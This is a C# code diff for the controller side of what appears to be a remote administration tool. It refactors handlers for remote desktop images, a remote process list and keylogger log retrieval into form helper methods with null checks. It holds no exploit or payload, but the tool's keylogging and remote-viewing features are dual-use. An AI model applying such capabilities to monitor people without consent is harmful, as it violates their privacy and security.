@@ -17,14 +17,8 @@ namespace xServer.Core.Commands
 
             if (packet.Image == null)
             {
-                try
-                {
-                    client.Value.FrmRdp.Invoke(
-                        (MethodInvoker)delegate { client.Value.FrmRdp.picDesktop.Image = client.Value.LastDesktop; });
-                }
-                catch
-                {
-                }
+                if (client.Value.FrmRdp != null)
+                    client.Value.FrmRdp.UpdateImage(client.Value.LastDesktop);
 
                 client.Value.LastDesktop = null;
                 client.Value.LastDesktopSeen = true;
@@ -53,15 +47,8 @@ namespace xServer.Core.Commands
 
                     client.Value.LastDesktop = newScreen;
 
-                    try
-                    {
-                        client.Value.FrmRdp.Invoke(
-                            (MethodInvoker)
-                                delegate { client.Value.FrmRdp.picDesktop.Image = (Bitmap)newScreen.Clone(); });
-                    }
-                    catch
-                    {
-                    }
+                    if (client.Value.FrmRdp != null)
+                        client.Value.FrmRdp.UpdateImage((Bitmap)newScreen.Clone());
 
                     newScreen = null;
                 }
@@ -88,15 +75,8 @@ namespace xServer.Core.Commands
 
                         client.Value.LastDesktop = newScreen;
 
-                        try
-                        {
-                            client.Value.FrmRdp.Invoke(
-                                (MethodInvoker)
-                                    delegate { client.Value.FrmRdp.picDesktop.Image = (Bitmap)newScreen.Clone(); });
-                        }
-                        catch
-                        {
-                        }
+                        if (client.Value.FrmRdp != null)
+                            client.Value.FrmRdp.UpdateImage((Bitmap)newScreen.Clone());
 
                         newScreen = null;
                     }
@@ -112,7 +92,7 @@ namespace xServer.Core.Commands
             if (client.Value.FrmTm == null)
                 return;
 
-            client.Value.FrmTm.Invoke((MethodInvoker)delegate { client.Value.FrmTm.lstTasks.Items.Clear(); });
+            client.Value.FrmTm.ClearListview();
 
             new Thread(() =>
             {
@@ -120,17 +100,13 @@ namespace xServer.Core.Commands
                 {
                     if (packet.IDs[i] != 0 && packet.Processes[i] != "System.exe")
                     {
+                        if (client.Value.FrmTm == null)
+                            break;
+
                         ListViewItem lvi =
                             new ListViewItem(new string[] { packet.Processes[i], packet.IDs[i].ToString(), packet.Titles[i] });
-                        try
-                        {
-                            client.Value.FrmTm.Invoke(
-                                (MethodInvoker)delegate { client.Value.FrmTm.lstTasks.Items.Add(lvi); });
-                        }
-                        catch
-                        {
-                            break;
-                        }
+
+                        client.Value.FrmTm.AddProcessToListview(lvi);
                     }
                 }
             }).Start();
@@ -143,10 +119,7 @@ namespace xServer.Core.Commands
 
             if (packet.FileCount == 0)
             {
-                client.Value.FrmKl.Invoke((MethodInvoker)delegate
-                {
-                    client.Value.FrmKl.btnGetLogs.Enabled = true;
-                });
+                client.Value.FrmKl.SetGetLogsEnabled(true);
 
                 return;
             }
@@ -171,17 +144,16 @@ namespace xServer.Core.Commands
 
                 foreach (FileInfo file in iFiles)
                 {
-                    var file1 = file;
-                    client.Value.FrmKl.Invoke((MethodInvoker)delegate
-                    {
-                        client.Value.FrmKl.lstLogs.Items.Add(new ListViewItem() { Text = file1.Name });
-                    });
+                    if (client.Value.FrmKl == null)
+                        break;
+
+                    client.Value.FrmKl.AddLogToListview(file.Name);
                 }
 
-                client.Value.FrmKl.Invoke((MethodInvoker)delegate
-                {
-                    client.Value.FrmKl.btnGetLogs.Enabled = true;
-                });
+                if (client.Value.FrmKl == null)
+                    return;
+
+                client.Value.FrmKl.SetGetLogsEnabled(true);
             }
         }
 
@@ -190,18 +162,7 @@ namespace xServer.Core.Commands
             if (client.Value.FrmRdp == null)
                 return;
 
-            try
-            {
-                client.Value.FrmRdp.Invoke((MethodInvoker)delegate
-                {
-                    for (int i = 0; i < packet.Number; i++)
-                        client.Value.FrmRdp.cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
-                    client.Value.FrmRdp.cbMonitors.SelectedIndex = 0;
-                });
-            }
-            catch
-            {
-            }
+            client.Value.FrmRdp.AddMonitors(packet.Number);
         }
     }
 }
